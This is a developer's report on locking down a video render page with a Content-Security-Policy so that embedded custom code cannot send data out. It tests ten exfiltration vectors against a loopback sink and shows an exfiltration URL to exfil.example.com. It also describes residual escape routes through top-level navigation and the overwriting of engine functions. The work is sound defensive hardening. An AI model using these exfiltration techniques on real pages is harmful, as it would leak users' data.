# Task 4 Report: The render page cannot reach the network

**Branch:** `feat/video-phase-04-engine` · **Follows:** `ca73d0c`

| Commit | |
|---|---|
| `28f8000` | test: ten ways a custom beat reaches the network, all of them open |
| `d60b85e` | feat: the render page cannot reach the network |

Files: `engine/network.test.mjs` (new), `engine/scene.html`.
No new dependencies. `git status --porcelain -- src tests engine` is empty.

---

## 1. The final policy, directive by directive

In `engine/scene.html`, in the page, immediately after `<title>`:

```
default-src 'self';
script-src 'self' 'unsafe-inline' 'unsafe-eval';
style-src 'self' 'unsafe-inline';
img-src 'self';
font-src 'self';
connect-src 'none';
frame-src 'none';
child-src 'none';
worker-src 'none';
object-src 'none';
media-src 'none';
manifest-src 'none';
base-uri 'none';
form-action 'none'
```

| Directive | Why it is as loose as it is |
|---|---|
| `default-src 'self'` | The floor. Measured, not assumed: over `file://` Chromium **does** match the page's own directory, so `engine.js`, `planbuild.js`, `.plan.js` and `content/*.js` all load under bare `'self'`. No `file:` scheme source was needed. |
| `script-src … 'unsafe-inline'` | **Loosened, and it had to be.** With `default-src 'self'` alone the page died — `total = undefined`, and Chromium refused four inline scripts including the bootstrap that `document.write()`s the day's script. Hashes were rejected as an alternative: the bootstrap is per-day-arbitrary only in the URL it writes, but pinning hashes of four inline blocks means every edit to `scene.html` silently breaks the renderer until someone recomputes them. That is the D-036 drift pattern with a security label on it. |
| `script-src … 'unsafe-eval'` | **Loosened, and it had to be.** `buildCustom` is `new Function('s', b.js)`. Without `'unsafe-eval'` every `custom` beat throws and the determinism fixture fails. This is not a hole the CSP was ever closing — see §5. |
| `style-src 'self' 'unsafe-inline'` | **Loosened, and it had to be.** The `<style>` block is inline, and more importantly the entire animation system is inline style *attributes* — `el.style.transform` on every element on every `__seek(t)`. `style-src-attr` falls back to `style-src`; without `'unsafe-inline'` nothing moves. |
| `img-src 'self'`, `font-src 'self'` | **Not loosened.** `data:` was not needed: grepped and then measured — the engine loads no image and no webfont at all (system font stack, CSS gradients, inline SVG). Left at `'self'` rather than `'none'` so a *local* asset added later keeps working while a remote one is refused. This is stricter than the brief anticipated. |
| `connect-src 'none'` | `fetch`, `XMLHttpRequest`, `sendBeacon`, `EventSource`, `WebSocket`. The exfiltration path measured in Task 3. |
| `frame-src`/`child-src`/`worker-src 'none'` | An `<iframe>` is a fresh document with its own network; a `Worker` is a thread with its own `fetch`. Both verified blocked (§2, §5). |
| `object-src`/`media-src`/`manifest-src 'none'` | Nothing here needs a plugin, a video or a manifest, and each is another way to name a URL. |
| `base-uri 'none'` | Otherwise a beat rewrites `<base>` and every relative script path in the file resolves somewhere else. |
| `form-action 'none'` | A submitted form is an outbound request with a body. Verified blocked (§5). |

Not expressible here, and stated in the file: `frame-ancestors` and `sandbox` are ignored in a `<meta>` policy, and no directive stops a top-level navigation. §5 covers that.

**Visibility (R3).** First script in the file, so a violation while the rest of it parses is still caught. A `securitypolicyviolation` listener writes to three places: `window.__cspViolations`, `console.error`, and a rethrow on a fresh task so it becomes an uncaught error. It also fills a `#csp` line **inside `#ui`**, the scrubber bar — which `body.render` hides, so an operator scrubbing the slider sees it and no frame ever can.

Through the renderer, with a hostile beat whose `attest` says "draws one line of copy and nothing else":

```
page errors:
  Error: Content-Security-Policy refused https://exfil.example.com/x?d=The%20Brief (connect-src)
exit=1
```

The render **fails**, and it names the URL and the directive.

---

## 2. Evidence no request escapes

`engine/network.test.mjs` fires each vector from inside a `custom` beat in a plan.
**The oracle is a real HTTP server on 127.0.0.1**, not Playwright's `request` event.
That change was forced by measurement: with the policy in place, Chromium still
reported a CSP-refused XHR on `page.on('request')`, so a request-event assertion
called a working policy a leak. A byte arriving at a socket is not ambiguous.
`page.on('requestfailed')` is kept as diagnosis, and prints the reason.

**Before the policy** (`git checkout` of `scene.html`, same test) — every one of the ten delivers real bytes to a real socket:

```
FAIL scene.html carries the policy itself — no <meta http-equiv="Content-Security-Policy"> in the page
FAIL fetch                nothing reached the sink — RECEIVED ["GET /x?d=The%20Brief"]
FAIL XMLHttpRequest       nothing reached the sink — RECEIVED ["GET /x?d=The%20Brief"]
FAIL img src              nothing reached the sink — RECEIVED ["GET /x.png?d=The%20Brief"]
FAIL script src           nothing reached the sink — RECEIVED ["GET /x.js"]
FAIL iframe               nothing reached the sink — RECEIVED ["GET /x?d=The%20Brief"]
FAIL dynamic import()     nothing reached the sink — RECEIVED ["GET /x.mjs"]
FAIL navigator.sendBeacon nothing reached the sink — RECEIVED ["POST /x"]
FAIL WebSocket            nothing reached the sink — RECEIVED ["UPGRADE /x"]
FAIL link rel=prefetch    nothing reached the sink — RECEIVED ["GET /x"]
FAIL EventSource          nothing reached the sink — RECEIVED ["GET /x"]
21 FAILURES
```

**After:**

```
  ok   scene.html carries the policy itself
  ok   fetch                nothing reached the sink (never even asked)
  ok   fetch                the page still renders
  ok   fetch                the refusal is visible
  ok   XMLHttpRequest       nothing reached the sink (asked for it; http://127.0.0.1:52632/x?d=The%20Brief → csp)
  ok   XMLHttpRequest       the page still renders
  ok   XMLHttpRequest       the refusal is visible
  ok   img src              nothing reached the sink (asked for it; http://127.0.0.1:52632/x.png?d=The%20Brief → csp)
  ok   img src              the page still renders
  ok   img src              the refusal is visible
  ok   script src           nothing reached the sink (asked for it; http://127.0.0.1:52632/x.js → csp)
  ok   script src           the page still renders
  ok   script src           the refusal is visible
  ok   iframe               nothing reached the sink (never even asked)
  ok   iframe               the page still renders
  ok   iframe               the refusal is visible
  ok   dynamic import()     nothing reached the sink (asked for it; http://127.0.0.1:52632/x.mjs → csp)
  ok   dynamic import()     the page still renders
  ok   dynamic import()     the refusal is visible
  ok   navigator.sendBeacon nothing reached the sink (never even asked)
  ok   navigator.sendBeacon the page still renders
  ok   navigator.sendBeacon the refusal is visible
  ok   WebSocket            nothing reached the sink (never even asked)
  ok   WebSocket            the page still renders
  ok   WebSocket            the refusal is visible
  ok   link rel=prefetch    nothing reached the sink (asked for it; http://127.0.0.1:52632/x → csp)
  ok   link rel=prefetch    the page still renders
  ok   link rel=prefetch    the refusal is visible
  ok   EventSource          nothing reached the sink (asked for it; http://127.0.0.1:52632/x → csp)
  ok   EventSource          the page still renders
  ok   EventSource          the refusal is visible
no request escapes the page
exit=0
```

`→ csp` is Chromium's own failure reason. `the page still renders` asserts the
beat's copy is on screen *and* that `engine.js`, `planbuild.js` and `.plan.js`
were loaded, so a policy that killed the engine cannot pass as one that worked.

**Every run above is over `file://`.** The test never uses a web server for the
page; it drives `scene.html` directly, the same way the operator opens it.

---

## 3. Both probes and determinism

```
== node render.mjs --day 2026-08-14 --probe
2026-08-14 · 119.99s · 3600 frames @ 30fps
25 probe frames → /Users/aabdukarim/Documents/Code/agenticsocial/engine/probe
exit=0

== node render.mjs --day 2026-08-12 --probe
2026-08-12 · 119.97s · 3599 frames @ 30fps
24 probe frames → /Users/aabdukarim/Documents/Code/agenticsocial/engine/probe
exit=0
```

Stronger than "still renders" — the frames are **byte-identical** to the frames
the same commits produce with the policy deleted (probes rendered to separate
directories, `shasum -a 256` diffed):

```
2026-08-14: 25 frames byte-identical with and without the policy
2026-08-12: 24 frames byte-identical with and without the policy
```

Determinism (tail; every line `ok`, and the hashes match the pre-policy baseline):

```
  ok   plan path t=32.16  dc0caa083b35 dc0caa083b35
  ok   plan path t=32.16  chrome text stable from every predecessor
  ok   beat 0 (statement) renders its text
  …
  ok   beat 10 (custom) renders its text
  ok   every builder has a fixture (10)
deterministic
exit=0
```

---

## 4. Mutation results — 5 / 5

Each mutant applied to the committed files, `node network.test.mjs` run, then restored.

| # | Mutant | Result |
|---|---|---|
| M1 | CSP removed | **killed** — `21 FAILURES`; all ten vectors `RECEIVED` at the sink |
| M2 | `connect-src *` | **killed** — `12 FAILURES`; fetch, XHR, sendBeacon, WebSocket, EventSource all `RECEIVED`. The img/script/iframe/prefetch vectors stay blocked by the other directives, which is the point of not relying on one line |
| M3 | `default-src 'self'; connect-src 'none'` only (too strict) | **killed** — `20 FAILURES`, every one of them `the page still renders — the beat drew nothing — never loaded [".plan.js"]`. Nothing leaks, and the test still fails, which is the correct verdict on a broken renderer |
| M4 | CSP removed, `page.route` abort in `render.mjs` instead | **killed** — `21 FAILURES`. The test never goes through `render.mjs`, so a runner-side block is invisible to it — exactly the slider-scrubbing path R2 protects |
| M5 | violation listener swallows (no push, no `console.error`, no rethrow) | **killed** — `10 FAILURES`, all `the refusal is visible — window.__cspViolations is empty — nothing reached pageerror`. Nothing leaked; the render would have gone green on an exfiltration attempt |

M3's failure mode is worth keeping in mind: a too-strict policy passes the leak
check trivially. Only the render assertion separates it from a good one.

---

## 5. Issues and concerns

### What a `custom` beat can still do

**The network half is closed. The problem is not solved.** A CSP is a network
boundary, not an execution boundary, and this task did not sandbox `custom`.
Measured on the page as it now stands:

```
reassign escapeHTML  violation=none  {"pwned":true}
overwrite __seek     violation=none  (no error; the assignment succeeds)
```

`escapeHTML` was reassigned to the identity function from inside a beat, after
validation had passed — the exact divergence Task 1 closed, reintroduced from a
`script.yaml`, and the CSP has nothing to say about it. A `custom` beat still:

- reads and writes every global, including `__seek`, `__scenes` and `__total`;
- mutates any other beat's DOM, so it can rewrite what a *different*, human-read
  beat puts on screen;
- reassigns engine functions, including the escaper;
- runs `new Function` — `'unsafe-eval'` is required for `custom` to exist at all,
  so the CSP cannot even pretend to constrain what code runs;
- reads `document`, `navigator`, `localStorage` and anything else in the page.

The only thing it can no longer do is **tell anyone**, over a subresource
request. The real control for `custom` remains `attest` plus a human reading it,
exactly as D-062 framed the freeze: the floor is much higher, and it is not a wall.

### Does it hold from the filesystem?

**Yes, and that is the only way it was ever tested.** Every run in this report —
the ten vectors, both probes, determinism, all five mutants — loads
`file:///…/engine/scene.html`. There is no server anywhere in the engine. The
policy is a `<meta>` in the document, so it is enforced by the page parser
before any of its own scripts run, and the operator dragging the slider gets the
identical policy the renderer does. This is why M4 is a real mutant and not a
formality.

### Remaining paths out — tested, not reasoned about

Beyond the ten in the committed test, run against the same loopback sink:

| Vector | Result |
|---|---|
| `Worker` from a `blob:` URL, fetching inside | **blocked** — `refused blob (worker-src)`, sink empty |
| `SharedWorker` from a `blob:` URL | **blocked** — `refused blob (worker-src)`, sink empty |
| `<form method=POST>` + `submit()` | **blocked** — `refused http://…/form (form-action)`, sink empty |
| `location.href = 'http://…?d=' + document.title` | **GETS OUT** — sink received `GET /nav?d=The%20Brief`, no violation |
| `window.open('http://…?d=' + document.title)` | **GETS OUT** — sink received `GET /open?d=The%20Brief`, popup opened, no violation |
| `<a href>` + `.click()` | **GETS OUT** — sink received `GET /anchor?d=1`, no violation |

**Top-level navigation is the residual hole, and it is not closable with CSP.**
`navigate-to` was dropped from CSP Level 3 and never shipped in Chromium;
`form-action` covers forms only. A `custom` beat can still put page data in a URL
and navigate to it.

Three things bound it, and none of them is a fix:

1. It is **not silent**. The document is replaced, so `window.__seek` is gone and
   `render.mjs`'s next `page.evaluate` fails — the render dies rather than
   producing a video with an exfiltration in its history. In my probe the
   `form.submit()` case did not even settle its `load` event. An operator on the
   slider watches the page navigate away in front of them.
2. It is **one-shot and coarse** — a URL and a query string, not a stream.
3. It requires the beat to be run at all, which is what `attest` and the human
   reviewer gate.

Recommendations, neither of them in scope for this task:

- `render.mjs` could refuse any non-`file:` navigation (`page.on('framenavigated')`,
  or a route that aborts document requests) as defence in depth. That is a
  runner-side control and does **not** replace the page-side policy — the slider
  path would still be open — which is why it is not the fix and not done here.
- Phase 5's verifier should treat a `custom` beat that touches `location`,
  `window.open` or `<a>.click()` as something to put in front of the approver in
  `agsoc video review`, since that is where the actual boundary is.

### Smaller notes

- `'unsafe-inline'` in `script-src` is a real weakening of the policy against a
  *classic* XSS threat model. It is not a weakening against **this** threat
  model: the attacker's code is already inside a `<script>` we compile on purpose.
- The four inline blocks could be hashed instead. I did not, deliberately: hashes
  bind the policy to the exact bytes of `scene.html`, so any edit to the stage
  breaks the renderer with a CSP error until someone recomputes them, and the
  temptation under deadline is to widen the policy rather than rehash. Worth
  revisiting only if `custom` is ever sandboxed, at which point `'unsafe-eval'`
  goes too and hashes start buying something.
- The probe used `.invalid` hostnames at first and the request-event oracle; both
  were replaced by the loopback sink before commit, because "Chromium says it
  asked" and "bytes arrived" are different claims and only the second is evidence.
